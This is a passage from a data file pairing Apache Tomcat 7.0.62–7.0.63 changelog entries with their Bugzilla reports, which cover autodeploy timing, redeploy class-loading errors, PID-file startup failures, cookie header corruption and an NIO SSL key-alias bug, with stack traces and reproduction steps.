        QueryStats qs = getQueryStats(sql);
        qs.prepare(time); // <--- LINE 122
    }

Please let me know if you need any more info."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57783
Other|Tomcat 7.0.63 (violetagg)|update||Update package renamed Apache Commons BCEL to r1682271 to pick up some some code clean up. (markt)|||
Other|Tomcat 7.0.63 (violetagg)|update||Update package renamed Apache Commons File upload to r1682322 to pick up the post 1.3.1 fixes. (markt)|||
Other|Tomcat 7.0.63 (violetagg)|update||Update package renamed Apache Commons Codec to r1682326. No functional changes. Javadoc only. (markt)|||
Catalina|Tomcat 7.0.62 (violetagg)|add||Allow logging of the remote port in the access log using the format pattern %{remote}p. (rjung)|||
Catalina|Tomcat 7.0.62 (violetagg)|fix|57765|When checking last modified times as part of the automatic deployment process, account for the fact that File.lastModified() has a resolution of one second to ensure that if a file has been modified within the last second, the latest version of the file is always used. Note that a side-effect of this change is that files with modification times in the future are treated as if they are unmodified. (markt)|autodeploy sometimes fails to redeploy the latest war|"if a war file is updated multiple times within a 1s window the autodeployment logic may fail to deploy the latest war.

this is particularly a problem if doing something like wget to install a war directly to the webapps directory.  it may fail (because the zip is invalid) but then not retry when the download completes (presumably because the file timestamp is not different to the failed timestamp, even though the file *is* different.)

for example, try the following script:

    while [ true ]  ; do
      curl http://path/to/large/sample.war -o sample.war
      sleep 15
      if [ ! -d sample ] ; then exit ; fi
    done

with the sleep 15, tomcat should be guaranteed to unpack the war (running with its default 10s detect audodeployment files). however this script usually fails one in 20 times with a sufficiently large war file (where download time is >5s). in such cases the last autodeployment attempt logs an invalid zip, there is no subsequent autodeployment, and the timestamp of the completed (valid) download is identical to the log timestamp of the failed autodeployment, at least to a one-second resolution (common on filesystems).

what i suspect is happening is, for example:

    00:00:00.100 sample.war is partially written
    00:00:00.200 autodeployment is attempted, and fails
    00:00:00.300 sample.war is completely written
    00:00:10.200 subsequent autodeployment cycle does not attempt re-deployment

i suspect that at time 00:00:00.200, when the deployment fails, it records a ""last update"" timestamp.  10 seconds later it checks the timestamp of the file on disk, which will be 00:00:00 (note no milliseconds) which is not later than the ""last update"" timestamp and so it incorrectly skips the redeployment.

this could probably also result in the following situation

    00:00:00.100 sample.war v1 is written
    00:00:00.200 autodeployment is done
    00:00:00.300 sample.war v2 is written
    00:00:10.200 subsequent autodeployment cycle does not attempt re-deployment

and so v1 is deployed even though v2 was subsequently written.

i suggest that autodeployment should wait for files to stabilise, i.e. skipping any file updated within the 1s window immediately prior to autodeployment (and ensuring that it is picked up on the next autodeployment cycle, unless it is still being changed).

there are workarounds:

* download to a tmp directory then atomically `mv` the file to the webapps directory upon completion
* use the manager webapp instead of autodeployment

but it would be nice to fix this so that autodeployment works as advertised (and i think the fix sketched here should be fairly straightforward)."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57765
Catalina|Tomcat 7.0.62 (violetagg)|fix||Align redeploy resource modification checking with reload modification checking so that now, in both cases, a change in modification time rather than an increase in modification time is used to determine if the resource has changed. (markt)|||
Catalina|Tomcat 7.0.62 (violetagg)|fix||Cleanup o.a.tomcat.util.digester.Digester from debug messages that do not give any valuable information. Patch provided by Polina Genova. (violetagg)|||
Catalina|Tomcat 7.0.62 (violetagg)|fix|57772|When reloading a web application and a directory representing an expanded WAR needs to be deleted, delete the directory after the web application has been stopped rather than before to avoid potential ClassNotFoundExceptions. (markt)|WebappClassLoader throws a ClassNotFoundError when the Manager is deploying a new WAR|"Overview:
When contexts are updated through the Tomcat manager interface, ServletContextListener.contextDestroyed implementations which need to load classes throw ClassNotFoundError.

Steps to reproduce:
1. Create an instance of Tomcat 8.0.20
2. In server.xml, configure the Host with unpackWARs=""true"" autoDeploy=""false"".
3. Check out the example webapp from https://github.com/austinjones/ClassNotFoundGenerator
4. Build the testing WAR using the 'distribute' ant task.
5. Deploy the WAR using an HTTP request to this URL:
http://<your-local-tomcat>/manager/text/deploy?
 war=path/to/workspace/ClassNotFoundGenerator/dist/ClassNotFoundGenerator.war
 &config=path/to/workspace/ClassNotFoundGenerator/web/context.xml
 &path=/ClassNotFoundGenerator
 &update=true
6. Open localhost.log, and verify the ClassNotFoundError was logged.

Actual results:
The ClassNotFoundError is thrown by TestcaseContextListener.contextDestroyed, and printed to localhost.log.  Any further work the context listener was responsible for is not executed.

Expected Results:
The WebappClassLoader successfully loads classes during ServletContextListener.contextDestroyed, and completes without a throw.  No ClassNotFoundError is printed to localhost.log

Build Date & Hardware:
Tomcat 8.0.12 on CentOS Linux 6.6

Additional Builds and Platforms:
Tomcat 8.0.12 on Windows 7 SP1
Tomcat 8.0.20 on Windows 7 SP1
Tomcat 8.0.20 on CentOS Linux 6.6

Note: if you try the 'steps to reproduce' on 8.0.12, the deployment will probably fail due to bug 56398 - which I worked around in 8.0.12.  You'll be able to deploy if you change the name of the test app to 'classnotfoundgenerator'.

Additional Information:
ServletContextListeners that need to load classes during the contextDestroyed call throw ClassNotFoundError, when the application is deployed as a WAR through the Manager interface.  Here is an example listener, where ThisClassNotFound is not loaded for the first time in contextDestroyed.
  https://github.com/austinjones/ClassNotFoundGenerator/blob/master/src/com/avadyne/TestcaseContextListener.java

The stack trace of the ClassNotFoundError on 8.0.20 is:
6-Mar-2015 14:38:46.838 SEVERE [http-nio-8443-exec-5] org.apache.catalina.core.StandardContext.listenerStop Exception sending context destroyed event to listener instance of class com.avadyne.TestcaseContextListener
 java.lang.NoClassDefFoundError: com/avadyne/ThisClassNotFound
	at com.avadyne.TestcaseContextListener.contextDestroyed(TestcaseContextListener.java:27)
	at org.apache.catalina.core.StandardContext.listenerStop(StandardContext.java:4775)
	at org.apache.catalina.core.StandardContext.stopInternal(StandardContext.java:5385)
	at org.apache.catalina.util.LifecycleBase.stop(LifecycleBase.java:232)
	at org.apache.catalina.core.StandardContext.reload(StandardContext.java:3739)
	at org.apache.catalina.startup.HostConfig.reload(HostConfig.java:1304)
	at org.apache.catalina.startup.HostConfig.checkResources(HostConfig.java:1236)
	at org.apache.catalina.startup.HostConfig.check(HostConfig.java:1491)
	at sun.reflect.NativeMethodAccessorImpl.invoke0(Native Method)
	at sun.reflect.NativeMethodAccessorImpl.invoke(NativeMethodAccessorImpl.java:62)
	at sun.reflect.DelegatingMethodAccessorImpl.invoke(DelegatingMethodAccessorImpl.java:43)
	at java.lang.reflect.Method.invoke(Method.java:483)
	at org.apache.tomcat.util.modeler.BaseModelMBean.invoke(BaseModelMBean.java:300)
	at com.sun.jmx.interceptor.DefaultMBeanServerInterceptor.invoke(DefaultMBeanServerInterceptor.java:819)
	at com.sun.jmx.mbeanserver.JmxMBeanServer.invoke(JmxMBeanServer.java:801)
	at org.apache.catalina.manager.ManagerServlet.check(ManagerServlet.java:1460)
	at org.apache.catalina.manager.ManagerServlet.deploy(ManagerServlet.java:906)
	at org.apache.catalina.manager.ManagerServlet.doGet(ManagerServlet.java:344)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:618)
	at javax.servlet.http.HttpServlet.service(HttpServlet.java:725)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:291)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.tomcat.websocket.server.WsFilter.doFilter(WsFilter.java:52)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:239)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.catalina.filters.SetCharacterEncodingFilter.doFilter(SetCharacterEncodingFilter.java:108)
	at org.apache.catalina.core.ApplicationFilterChain.internalDoFilter(ApplicationFilterChain.java:239)
	at org.apache.catalina.core.ApplicationFilterChain.doFilter(ApplicationFilterChain.java:206)
	at org.apache.catalina.core.StandardWrapperValve.invoke(StandardWrapperValve.java:219)
	at org.apache.catalina.core.StandardContextValve.invoke(StandardContextValve.java:106)
	at org.apache.catalina.authenticator.AuthenticatorBase.invoke(AuthenticatorBase.java:613)
	at org.apache.catalina.core.StandardHostValve.invoke(StandardHostValve.java:142)
	at org.apache.catalina.valves.ErrorReportValve.invoke(ErrorReportValve.java:79)
	at org.apache.catalina.valves.AbstractAccessLogValve.invoke(AbstractAccessLogValve.java:610)
	at org.apache.catalina.core.StandardEngineValve.invoke(StandardEngineValve.java:88)
	at org.apache.catalina.connector.CoyoteAdapter.service(CoyoteAdapter.java:516)
	at org.apache.coyote.http11.AbstractHttp11Processor.process(AbstractHttp11Processor.java:1086)
	at org.apache.coyote.AbstractProtocol$AbstractConnectionHandler.process(AbstractProtocol.java:659)
	at org.apache.coyote.http11.Http11NioProtocol$Http11ConnectionHandler.process(Http11NioProtocol.java:223)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1558)
	at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1515)
	at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1142)
	at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:617)
	at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
	at java.lang.Thread.run(Thread.java:745)
Caused by: java.lang.ClassNotFoundException: com.avadyne.ThisClassNotFound
	at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1305)
	at org.apache.catalina.loader.WebappClassLoaderBase.loadClass(WebappClassLoaderBase.java:1157)
	... 45 more

The stack trace where Tomcat attempts to load ThisClassNotFound is (8.0.20):
Daemon Thread [http-nio-8443-exec-31] (Suspended)	
	owns: WebappClassLoader  (id=3483)	
	owns: TestcaseContextListener  (id=3488)	
	owns: StandardContext  (id=3324)	
	owns: HostConfig  (id=3323)	
	owns: SecureNioChannel  (id=3313)	
	StandardRoot.getResourceInternal(String, boolean) line: 302	
	Cache.getResource(String, boolean) line: 65	
	StandardRoot.getResource(String, boolean, boolean) line: 216	
	StandardRoot.getClassLoaderResource(String) line: 225	
	WebappClassLoader(WebappClassLoaderBase).findResourceInternal(String, String) line: 2548	
	WebappClassLoader(WebappClassLoaderBase).findClassInternal(String) line: 2405	
	WebappClassLoader(WebappClassLoaderBase).findClass(String) line: 854	
	WebappClassLoader(WebappClassLoaderBase).loadClass(String, boolean) line: 1274	
	WebappClassLoader(WebappClassLoaderBase).loadClass(String) line: 1157	
	TestcaseContextListener.contextDestroyed(ServletContextEvent) line: 27	
	StandardContext.listenerStop() line: 4775	
	StandardContext.stopInternal() line: 5385	
	StandardContext(LifecycleBase).stop() line: 232	
	StandardContext.reload() line: 3739	
	HostConfig.reload(HostConfig$DeployedApplication) line: 1304	
	HostConfig.checkResources(HostConfig$DeployedApplication) line: 1236	
	HostConfig.check(String) line: 1491	
	NativeMethodAccessorImpl.invoke0(Method, Object, Object[]) line: not available [native method]	
	NativeMethodAccessorImpl.invoke(Object, Object[]) line: 62	
	DelegatingMethodAccessorImpl.invoke(Object, Object[]) line: 43	
	Method.invoke(Object, Object...) line: 483	
	BaseModelMBean.invoke(String, Object[], String[]) line: 300	
	DefaultMBeanServerInterceptor.invoke(ObjectName, String, Object[], String[]) line: 819	
	JmxMBeanServer.invoke(ObjectName, String, Object[], String[]) line: 801	
	ManagerServlet.check(String) line: 1460	
	ManagerServlet.deploy(PrintWriter, String, ContextName, String, boolean, StringManager) line: 906	
	ManagerServlet.doGet(HttpServletRequest, HttpServletResponse) line: 344	
	ManagerServlet(HttpServlet).service(HttpServletRequest, HttpServletResponse) line: 618	
	ManagerServlet(HttpServlet).service(ServletRequest, ServletResponse) line: 725	
	ApplicationFilterChain.internalDoFilter(ServletRequest, ServletResponse) line: 291	
	ApplicationFilterChain.doFilter(ServletRequest, ServletResponse) line: 206	
	WsFilter.doFilter(ServletRequest, ServletResponse, FilterChain) line: 52	
	ApplicationFilterChain.internalDoFilter(ServletRequest, ServletResponse) line: 239	
	ApplicationFilterChain.doFilter(ServletRequest, ServletResponse) line: 206	
	SetCharacterEncodingFilter.doFilter(ServletRequest, ServletResponse, FilterChain) line: 108	
	ApplicationFilterChain.internalDoFilter(ServletRequest, ServletResponse) line: 239	
	ApplicationFilterChain.doFilter(ServletRequest, ServletResponse) line: 206	
	StandardWrapperValve.invoke(Request, Response) line: 219	
	StandardContextValve.invoke(Request, Response) line: 106	
	BasicAuthenticator(AuthenticatorBase).invoke(Request, Response) line: 613	
	StandardHostValve.invoke(Request, Response) line: 142	
	ErrorReportValve.invoke(Request, Response) line: 79	
	AccessLogValve(AbstractAccessLogValve).invoke(Request, Response) line: 610	
	StandardEngineValve.invoke(Request, Response) line: 88	
	CoyoteAdapter.service(Request, Response) line: 516	
	Http11NioProcessor(AbstractHttp11Processor).process(SocketWrapper<S>) line: 1086	
	Http11NioProtocol$Http11ConnectionHandler(AbstractProtocol$AbstractConnectionHandler).process(SocketWrapper<S>, SocketStatus) line: 659	
	Http11NioProtocol$Http11ConnectionHandler.process(SocketWrapper<NioChannel>, SocketStatus) line: 223	
	NioEndpoint$SocketProcessor.doRun(SelectionKey, NioEndpoint$KeyAttachment) line: 1558	
	NioEndpoint$SocketProcessor.run() line: 1515	
	ThreadPoolExecutor(ThreadPoolExecutor).runWorker(ThreadPoolExecutor$Worker) line: 1142	
	ThreadPoolExecutor$Worker.run() line: 617	
	TaskThread$WrappingRunnable.run() line: 61	
	TaskThread(Thread).run() line: 745	

The ClassLoader gives up on loading the class.  The WebResourceSet it would have used to load the class from (in the method StandardRoot.getResourceInternal) is a DirResourceSet pointed to the exploded directory path - e.g. /path/to/tomcat/webapps/ClassNotFoundGenerator/.  The path it generates in DirResourceSet.getResource is /path/to/tomcat/webapps/ClassNotFoundGenerator/WEB-INF/classes/com/avadyne/ThisClassNotFound.class - the path is correct.  The file doesn't exist, and it returns a new EmptyResource(root, path, f).

When the WebappClassLoader attempts to load the class, the .class file (and the entire exploded directory) is not on the disk.  The bug occurs during these frames of the ClassNotFoundError stack trace (8.0.20).

 java.lang.NoClassDefFoundError: com/avadyne/ThisClassNotFound
...
 	at org.apache.catalina.core.StandardContext.reload(StandardContext.java:3739)
	at org.apache.catalina.startup.HostConfig.reload(HostConfig.java:1304)
	at org.apache.catalina.startup.HostConfig.checkResources(HostConfig.java:1236)
...

HostConfig.checkResources:1231 deletes the exploded directory
HostConfig.checkResources:1236 calls into StandardContext.reload
StandardContext.reload:3739 eventually invokes the ServletContextListeners

Once the contextDestroyed listeners are executed, the .class file doesn't exist (HostConfig.checkResources deleted it).  

It is unsafe for HostConfig.checkResources to delete the unpacked directory before the context is stopped.  However, WebappClassLoader is correct to throw a ClassNotFoundError, since the class doesn't exist on disk."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57772
Catalina|Tomcat 7.0.62 (violetagg)|fix|57801|Improve the error message in the start script in case the PID read from the PID file is already owned by a process. (rjung)|Tomcat catalina.sh fails to start  after machine is reboot because there is another process have the same PID as Tomcat before reboot|"We have set CATALINA_PID in setenv.sh.

After the machine is reboot, The PID file is still there and tomcat fails to start. 

The error message is: 
""Existing PID file found during start.
Tomcat appears to still be running with PID 3387. Start aborted.""

After checking, there is another process have the same PID: 3387.

After checking the code catalina.sh, the following logic has issue:


  if [ ! -z ""$CATALINA_PID"" ]; then
    if [ -f ""$CATALINA_PID"" ]; then
      if [ -s ""$CATALINA_PID"" ]; then
        echo ""Existing PID file found during start.""
        if [ -r ""$CATALINA_PID"" ]; then
          PID=`cat ""$CATALINA_PID""`
          ps -p $PID >/dev/null 2>&1
          if [ $? -eq 0 ] ; then
            echo ""Tomcat appears to still be running with PID $PID. Start aborted.""
            exit 1
          else


Tomcat should not treat tomcat is still alive.
The script should work anyway."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57801
Catalina|Tomcat 7.0.62 (violetagg)|fix|57824|Correct a regression in the fix for 57252 that broke request listeners for non-async requests that triggered an error that was handled by the ErrorReportingValve. (markt/violetagg)|fireRequestDestroyEvent does not get called when error page is not found|"When upgrading tomcat to 7.0.59 we started experience strange errors in WELD integration layer. It seems that when an error occurres (e.g. 403 reported by HttpServletResponse.sendError(HttpServletResponse.SC_FORBIDDEN)), which does not have error page handler declared in web.xml, the org.apache.catalina.Context.fireRequestDestroyEvent does not get called.

The problem may be related to the following change:

https://github.com/markt-asf/tomcat/commit/5e195b2f06dba1be3f90b0a9d1f67604af905e47

which was a fix of BUG#57252.

The problem may be in StandardHostValve

lines 319:324
        ErrorPage errorPage = context.findErrorPage(statusCode);
        if (errorPage == null) {
            // Look for a default error page
            errorPage = context.findErrorPage(0);
        }
        if (errorPage != null && response.setErrorReported()) {

i.e. if error page is not found the reposnse is not marked as ""setErrorReported""

and then lines 214-216

            if (!request.isAsync() && !response.isErrorReportRequired()) {
                context.fireRequestDestroyEvent(request);
            }

i.e. if request is synchronous and the error report is not required (caused by missing error page) the important lifecycle method is not called.

The workaround is to declare universal error handler page

	<error-page>
		<location>...</location>
	</error-page>

which ensures that some error page is always found.

The problem may also be related to BUG#57314 as it has the same symptoms reported in

http://weld.cdi-spec.org/documentation/ see What do WELD-xxx warnings mean?

ie WELD-000225, WELD-000335, WELD-000715 errors that report leaked resources caused by missing lifecycle method call.

According to this bug report we thought that the problem is caused by async requests (which we do not use explicitly), but declaring the error page correctly seems to fix the problem."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57824
Catalina|Tomcat 7.0.62 (violetagg)|fix|57841|Improve error logging during web application start. (markt)|Change logging defaults to avoid unusable feedback by default|Starting a deployed application can fail with the error message `SCHWERWIEGEND: Error listenerStart` which is unhelpful. Instead provide a usable feedback by default explaining the cause of a severe error. Those should be logged verbosely by default. If very experienced power user want to skip logging of severe/fatal error (even for those it's hard to imagine a cause), they can configure it. By default is should just work.|https://bz.apache.org/bugzilla/show_bug.cgi?id=57841
Catalina|Tomcat 7.0.62 (violetagg)|fix|57856|Ensure that any scheme/port changes implemented by the RemoteIpFilter also affect HttpServletResponse.sendRedirect(). (markt)|RemoteIpFilter does not replace Request within Response|"I've noticed an issue with the org.apache.catalina.connector.Response where the toAbsolute method called during a relative redirect is generating the wrong absolute uri.

If you enable the org.apache.catalina.filters.RemoteIpFilter to allow an upstream proxy to control whether the server is available over HTTP/HTTPS by setting an header such as ""X-Forwarded-Proto"", this state is not replicated within the Response.

Therefore, when the uri is generated, the scheme is not replaced with the value that is actually available within the Request so it will generate for HTTP scheme only.

I believe the RemoteIpFilter should also implement a wrapper for the Response on the sendRedirect method to correctly generate the URI."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57856
Catalina|Tomcat 7.0.62 (violetagg)|fix|57896|"Support defensive copying of ""cookie"" header so that unescaping double quotes in a cookie value does not corrupt original value of ""cookie"" header. This is an opt-in feature, enabled by org.apache.tomcat.util.http.ServerCookie.PRESERVE_COOKIE_HEADER or org.apache.catalina.STRICT_SERVLET_COMPLIANCE system property. (kkolinko)"|Option to preserve original cookie header when unquoting cookie value|"This issue was originally fixed by introducing a new configuration option in Tomcat 8 in r1448679 (for 8.0.0), backported to Tomcat 7 in r1675821 (for 7.0.62). It has not been fixed in Tomcat 6 yet.

I am filing this into Bugzilla to better document the problem.

The problem is that method ""unescapeDoubleQuotes"" modifies bytes in the buffer that it is processing
(The method is LegacyCookieProcessor.unescapeDoubleQuotes() in current Tomcat 8, ServerCookie.unescapeDoubleQuotes() in current Tomcat 7 and 6).

As such, the value of original ""cookie"" HTTP header is corrupted. It can be noted by calling request.getHeader(""cookie"") or by logging the header value in AccessLogValve.

Steps to reproduce with current Tomcat 6 (6.0.43), Firefox 37.0.2:

1. Configure an AccessLogValve to log incoming ""cookie"" and outgoing ""set-cookie"" HTTP headers.

That is, uncomment AccessLogValve in Host element of server.xml and set the following value for pattern attribute:

    pattern=""%h %l %u %t &quot;%r&quot; %s %b [Cookie received: %{cookie}i] [Set-Cookie sent: %{set-cookie}o]""

2. Start Tomcat and open Servlets Examples -> Cookies  page in examples web application,

http://localhost:8080/examples/servlets/servlet/CookieExample

3. Fill the form to create a cookie and submit it:
Name: foo
Value: bar ""baz""

4. Re-visit the Cookies example page, so that browser sends you the cookie that was created.

5. Look into access log file.

The logs look like the following:

127.0.0.1 - - [07/May/2015:15:25:37 +0400] ""GET /examples/servlets/servlet/CookieExample HTTP/1.1"" 200 637 [Cookie received: -] [Set-Cookie sent: -]
127.0.0.1 - - [07/May/2015:15:28:24 +0400] ""POST /examples/servlets/servlet/CookieExample HTTP/1.1"" 200 809 [Cookie received: -] [Set-Cookie sent: foo=""bar \""baz\""""; Version=1]
127.0.0.1 - - [07/May/2015:15:28:42 +0400] ""GET /examples/servlets/servlet/CookieExample HTTP/1.1"" 200 714 [Cookie received: foo=""bar ""baz""\""""] [Set-Cookie sent: -]

Actual value:
[Cookie received: foo=""bar ""baz""\""""]
Expected value:
[Cookie received: foo=""bar \""baz\""""]

Notes:
======
1. This happens only with unquoting of '""' character. No other character are unquoted by unescapeDoubleQuotes() method.

2. Current specification of cookies (RFC6265) defines that cookie values cannot contain double quote and backslash characters. A well-behaving web application should not create cookies whose values contain such characters.

 cookie-value      = *cookie-octet / ( DQUOTE *cookie-octet DQUOTE )
 cookie-octet      = %x21 / %x23-2B / %x2D-3A / %x3C-5B / %x5D-7E
                       ; US-ASCII characters excluding CTLs,
                       ; whitespace DQUOTE, comma, semicolon,
                       ; and backslash

3. The fix introduced new system property,
org.apache.tomcat.util.http.ServerCookie.PRESERVE_COOKIE_HEADER

It defaults to 'false'. By default you have to opt-in for this fix by setting that property to 'true'.

When running in ""strict servlet compliance"" mode, that setting defaults to 'true' and the fix is enabled.

The new Rfc6265CookieProcessor implementation of CookieProcessor that is available as an opt-in feature in Tomcat 8 does not have this bug and is not affected by that configuration option."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57896
Coyote|Tomcat 7.0.62 (violetagg)|fix|57779|When an I/O error occurs on a non-container thread only dispatch to a container thread to handle the error if using Servlet 3+ asynchronous processing. This avoids potential deadlocks if an application is performing I/O on a non-container thread without using the Servlet 3+ asynchronous API. (markt)|Deadlock if using separate thread to write to ServletOutputStream|"If using a separate (non-container) thread to write to a ServletOutputStream, a deadlock can occur, if an io-error occurs during write. For example, if the client drops the connection.
This is caused by a synchronized operation on the the underlying socket-object.

The servlet handling thread is blocked, while waiting for the end of output from the separate thread, and holds a lock on the socket-object:

""http-bio-25030-exec-10"" daemon prio=10 tid=0x0000000001804800 nid=0x3fd0 waiting on condition [0x00007f767aeeb000]
   java.lang.Thread.State: WAITING (parking)
        at sun.misc.Unsafe.park(Native Method)
        - parking to wait for  <0x00000000c3b273b8> (a java.util.concurrent.locks.AbstractQueuedSynchronizer$ConditionObject)
 ...
 at org.apache.tomcat.util.net.JIoEndpoint$SocketProcessor.run(JIoEndpoint.java:314)
        - locked <0x00000000c38ef6d8> (a org.apache.tomcat.util.net.SocketWrapper)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
        at java.lang.Thread.run(Thread.java:745)


The separate thread trys to write, but an io-error occurs:

""Thread-13"" daemon prio=10 tid=0x00007f767c5c8000 nid=0x3fda waiting for monitor entry [0x00007f767a4e2000]
   java.lang.Thread.State: BLOCKED (on object monitor)
        at org.apache.tomcat.util.net.JIoEndpoint.processSocketAsync(JIoEndpoint.java:560)
        - waiting to lock <0x00000000c38ef6d8> (a org.apache.tomcat.util.net.SocketWrapper)
        at org.apache.coyote.AbstractProcessor.setErrorState(AbstractProcessor.java:84)
        at org.apache.coyote.http11.AbstractHttp11Processor.action(AbstractHttp11Processor.java:802)
        at org.apache.coyote.Response.action(Response.java:172)
        at org.apache.catalina.connector.OutputBuffer.doFlush(OutputBuffer.java:363)
        at org.apache.catalina.connector.OutputBuffer.flush(OutputBuffer.java:331)
        at org.apache.catalina.connector.CoyoteOutputStream.flush(CoyoteOutputStream.java:101)

Now it trys to get a lock on the socket-object and both threads are blocked forever.

In the former tomcat version we used (7.0.53) this was not an issue. I had a look in the source code and saw that the failing code was invented later."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57779
Coyote|Tomcat 7.0.62 (violetagg)|fix|57833|When using JKS based keystores for NIO, ensure that the key alias is always converted to lower case since that is what JKS key stores expect. Based on a patch by Santosh Giri Govind M. (markt)|NIO connector fails SSL handshake due to uppercase letters in keyAlias name|"Created attachment 32664 [details]
Patch for fixing NIO connector SSL handshake exception due to uppercase letters in keyAlias

If we create a SSL enabled NIO connector with keyAlias name containing mixed case of letters i.e. uppercase and lowercase, for instance, ""externalCA"" and try to connect to that port using SSL, then the handshake fails with following exception:

====================================================
FINE: Error during SSL handshake
javax.net.ssl.SSLHandshakeException: no cipher suites in common
        at sun.security.ssl.Handshaker.checkThrown(Handshaker.java:1336)
        at sun.security.ssl.SSLEngineImpl.checkTaskThrown(SSLEngineImpl.java:519)
        at sun.security.ssl.SSLEngineImpl.writeAppRecord(SSLEngineImpl.java:1197)
        at sun.security.ssl.SSLEngineImpl.wrap(SSLEngineImpl.java:1169)
        at javax.net.ssl.SSLEngine.wrap(SSLEngine.java:469)
        at org.apache.tomcat.util.net.SecureNioChannel.handshakeWrap(SecureNioChannel.java:301)
        at org.apache.tomcat.util.net.SecureNioChannel.handshake(SecureNioChannel.java:175)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1715)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1698)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
        at java.lang.Thread.run(Thread.java:745)
Caused by: javax.net.ssl.SSLHandshakeException: no cipher suites in common
        at sun.security.ssl.Alerts.getSSLException(Alerts.java:192)
        at sun.security.ssl.SSLEngineImpl.fatal(SSLEngineImpl.java:1639)
        at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:281)
        at sun.security.ssl.Handshaker.fatalSE(Handshaker.java:269)
        at sun.security.ssl.ServerHandshaker.chooseCipherSuite(ServerHandshaker.java:901)
        at sun.security.ssl.ServerHandshaker.clientHello(ServerHandshaker.java:629)
        at sun.security.ssl.ServerHandshaker.processMessage(ServerHandshaker.java:167)
        at sun.security.ssl.Handshaker.processLoop(Handshaker.java:901)
        at sun.security.ssl.Handshaker$1.run(Handshaker.java:841)
        at sun.security.ssl.Handshaker$1.run(Handshaker.java:839)
        at java.security.AccessController.doPrivileged(Native Method)
        at sun.security.ssl.Handshaker$DelegatedTask.run(Handshaker.java:1273)
        at org.apache.tomcat.util.net.SecureNioChannel.tasks(SecureNioChannel.java:285)
        at org.apache.tomcat.util.net.SecureNioChannel.handshakeUnwrap(SecureNioChannel.java:343)
        at org.apache.tomcat.util.net.SecureNioChannel.handshake(SecureNioChannel.java:193)
        ... 6 more

Apr 16, 2015 8:55:00 PM org.apache.tomcat.util.net.NioEndpoint$Poller cancelledKey
FINE: Failed to close socket
java.nio.channels.ClosedChannelException
        at sun.nio.ch.SocketChannelImpl.ensureWriteOpen(SocketChannelImpl.java:265)
        at sun.nio.ch.SocketChannelImpl.write(SocketChannelImpl.java:474)
        at org.apache.tomcat.util.net.SecureNioChannel.flush(SecureNioChannel.java:135)
        at org.apache.tomcat.util.net.SecureNioChannel.close(SecureNioChannel.java:370)
        at org.apache.tomcat.util.net.SecureNioChannel.close(SecureNioChannel.java:398)
        at org.apache.tomcat.util.net.NioEndpoint$Poller.cancelledKey(NioEndpoint.java:1115)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.doRun(NioEndpoint.java:1767)
        at org.apache.tomcat.util.net.NioEndpoint$SocketProcessor.run(NioEndpoint.java:1698)
        at java.util.concurrent.ThreadPoolExecutor.runWorker(ThreadPoolExecutor.java:1145)
        at java.util.concurrent.ThreadPoolExecutor$Worker.run(ThreadPoolExecutor.java:615)
        at org.apache.tomcat.util.threads.TaskThread$WrappingRunnable.run(TaskThread.java:61)
        at java.lang.Thread.run(Thread.java:745)

======================================================

Found out that the actual issue is not due to the mentioned exception message ""no cipher suites in common"" but instead the issue is due to the way X509KeyManager stores the private key. It uses map with keyAlias as key (converted to lowercase). And the calling code has to take care of passing keyAlias in lowercase while retrieving. This is correctly handled in JSSESocketFactory.getKeyManagers() method @line 594 if the key store type is default (JKS). 

But in case of NioEndpoint, the conversion of keyAlias to lowercase is missed and due to that, the private key is returned null causing the handshake to fail.

Please find attached the patch to fix the issue.

It would be good if we can throw exception with relevant message which would help us locate the issue faster.

Steps to reproduce:
------------------
1. Create a SSL enabled NIO connector with keyAlias name containing uppercase letters.
2. Try to connect to the NIO port over https. Then above exception can be seen if juli logging is enabled."|https://bz.apache.org/bugzilla/show_bug.cgi?id=57833
Coyote|Tomcat 7.0.62 (violetagg)|fix|57837|Add text/css to the default list of compressable MIME types. (markt)|"add ""text/css"" to default of compressableMimeType"|"as per https://tomcat.apache.org/tomcat-7.0-doc/config/http.html

I put compression=""10"" into the server.xml, but https://developers.google.com/speed/pagespeed claims gzip is not yet activated.

I have also tried
 compression=""on"" compressionMinSize=""512""

with the same result.

See https://p4u.ch/page_speed_rh"|https://bz.apache.org/bugzilla/show_bug.cgi?id=57837
